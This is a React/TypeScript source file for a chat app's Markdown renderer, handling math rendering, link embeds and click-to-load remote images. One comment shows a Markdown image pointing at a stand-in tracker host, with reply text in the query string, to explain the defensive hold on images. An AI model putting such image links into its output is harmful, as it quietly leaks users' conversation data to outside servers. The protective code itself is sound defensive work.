// Shared Markdown renderer: GFM plus math. Math is rendered to native MathML by Temml, which loads
// only when a message actually contains math, so ordinary chats pay nothing for it.
import { useEffect, useState } from "react";
import Markdown from "react-markdown";
import type { Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import { ImageOff } from "lucide-react";
import "temml/dist/Temml-Local.css";
import Embed, { embedFor } from "./Embed";

type Temml = typeof import("temml");
let temml: Temml | null = null;
let loading: Promise<Temml> | null = null;
const loadTemml = () => (loading ??= import("temml").then(m => (temml = (m as any).default ?? m)));

/** Renders TeX as MathML. Temml escapes text and refuses \href and similar unless trust is set. */
export function MathTex({ tex, display }: { tex: string; display: boolean }) {
  const [, ready] = useState(0);
  useEffect(() => { if (!temml) loadTemml().then(() => ready(n => n + 1)).catch(() => {}); }, []);
  if (!temml) return display ? <pre className="math-pending">{tex}</pre> : <code>{tex}</code>;
  let html: string;
  try { html = temml.renderToString(tex, { displayMode: display, throwOnError: true, trust: false, maxExpand: 500 }); }
  catch { return <code title="Could not read this formula">{tex}</code>; }
  const Tag = display ? "div" : "span";
  return <Tag className={display ? "math-display my-3 overflow-x-auto" : "math-inline"} dangerouslySetInnerHTML={{ __html: html }} />;
}

const LOCAL_SCHEMES = new Set(["blob", "data", "asset", "tauri", "ipc"]);
// Windows spells the app's own asset and IPC protocols as localhost hosts.
const LOCAL_HOSTS = new Set(["asset.localhost", "tauri.localhost", "ipc.localhost"]);

export type HeldImage = { host: string; action: "load" | "offline" };

/**
 * A Markdown image may point anywhere, so `![](https://tracker.example/pixel?reply=…)` would send part of a reply
 * to that server the moment the message renders. Remote sources are held back and described by host alone: the
 * path and query are exactly where a leak would hide. Images the app serves itself (blob: screenshots, data:
 * inline previews, the Tauri asset protocol) and relative bundle paths render normally. Offline chats never offer
 * to load a remote image.
 */
export function holdImage(src: string, offline: boolean): HeldImage | null {
  const raw = String(src ?? "").trim();
  if (!raw) return null;
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(raw)?.[1]?.toLowerCase();
  // No scheme and no leading two slashes means a path inside the app bundle. A backslash counts as a
  // slash in browsers, so that escaped form is held like anything else that would leave the app.
  if (scheme ? LOCAL_SCHEMES.has(scheme) : !/^[\/\\]{2}/.test(raw)) return null;
  let host = "";
  try {
    const url = new URL(raw.replace(/^[\/\\]{2}/, "https://"), "https://unknown.invalid/");
    host = url.host;
    if (LOCAL_HOSTS.has(host.replace(/:\d+$/, "").toLowerCase())) return null;
  } catch { /* not a URL at all: hold it too, with no host to show */ }
  return { host: host || "an address that cannot be read", action: offline ? "offline" : "load" };
}

/** Replaces a remote Markdown image until the reader asks for it, so nothing is requested before that click. */
function HeldImageView({ src, alt, offline }: { src: string; alt: string; offline: boolean }) {
  const [approved, setApproved] = useState<string | null>(null);
  const held = holdImage(src, offline);
  if (!held || approved === src) return <img src={src} alt={alt} loading="lazy" decoding="async" referrerPolicy="no-referrer" />;
  return (
    <span data-testid="held-image" className="not-prose my-2 inline-flex max-w-full items-center gap-2.5 rounded-xl border border-line bg-panel px-2.5 py-2 text-sm align-middle">
      <ImageOff size={15} className="shrink-0 text-muted" />
      <span className="min-w-0 flex-1">
        <span className="block truncate font-medium" title={held.host}>{held.host}</span>
        <span className="block truncate text-xs text-muted">{alt ? `Image: ${alt}` : "Image from the internet"}</span>
      </span>
      {held.action === "load"
        ? <button type="button" onClick={() => setApproved(src)} title={`Load this image from ${held.host}`}
            className="shrink-0 rounded-lg border border-line px-2.5 py-1 text-xs hover:bg-panel-2">Load image</button>
        : <span className="shrink-0 text-xs text-muted" title="Offline mode is on, so images from the internet stay unloaded">Offline</span>}
    </span>
  );
}

/**
 * Single dollars are only math when they look like it (Pandoc's rule): "$x^2$" is math, "$5 and $10" is not.
 * Such spans and \( \) become $$…$$ for remark-math, and \[ \] becomes a display block. Code is left alone.
 */
export function normalizeMath(src: string): string {
  if (!/[$\\]/.test(src)) return src;
  const parts = src.split(/(```[\s\S]*?(?:```|$)|~~~[\s\S]*?(?:~~~|$)|`[^`\n]*`)/);
  return parts.map((p, i) => i % 2 ? p : p
    .replace(/\\\[([\s\S]+?)\\\]/g, (_, m) => `\n$$\n${m.trim()}\n$$\n`)
    .replace(/\\\(([\s\S]+?)\\\)/g, (_, m) => `$$${m.trim()}$$`)
    .replace(/(^|[^$\\])\$(?!\$)(\S(?:[^$\n]*?\S)?)\$(?![$\d])/g, (_, pre, m) => `${pre}$$${m}$$`)).join("");
}

const mathComponents: Components = {
  code({ className, children, ...rest }) {
    const cls = String(className ?? "");
    if (/\bmath-(inline|display)\b/.test(cls)) return <MathTex tex={String(children).trim()} display={cls.includes("math-display")} />;
    return <code className={className} {...rest}>{children}</code>;
  },
  pre({ children, node, ...rest }) {
    const only = node?.children?.length === 1 ? node.children[0] as any : null;
    if (only?.tagName === "code" && /math-display/.test(String(only.properties?.className ?? ""))) return <>{children}</>;
    return <pre {...rest}>{children}</pre>;
  },
};

/** A paragraph holding nothing but a YouTube or OpenStreetMap link becomes an inline player or map. */
const embedComponents: Components = {
  p({ children, node, ...rest }) {
    const kids = (node?.children ?? []).filter((c: any) => !(c.type === "text" && !c.value.trim())) as any[];
    const href = kids.length === 1 && kids[0].tagName === "a" ? String(kids[0].properties?.href ?? "") : "";
    const target = href ? embedFor(href) : null;
    return target ? <Embed e={target} /> : <p {...rest}>{children}</p>;
  },
};

/** `images` holds remote images behind a click (chat); without it Markdown images render as they always have. */
export default function Md({ children, components, embeds = false, images }: { children: string; components?: Components; embeds?: boolean; images?: { offline?: boolean } }) {
  const imageComponents: Components = images
    ? { img: ({ src, alt }) => <HeldImageView src={String(src ?? "")} alt={String(alt ?? "")} offline={!!images.offline} /> }
    : {};
  return <Markdown remarkPlugins={[remarkGfm, [remarkMath, { singleDollarTextMath: false }]]}
    components={{ ...mathComponents, ...(embeds ? embedComponents : {}), ...imageComponents, ...components }}>{normalizeMath(children)}</Markdown>;
}
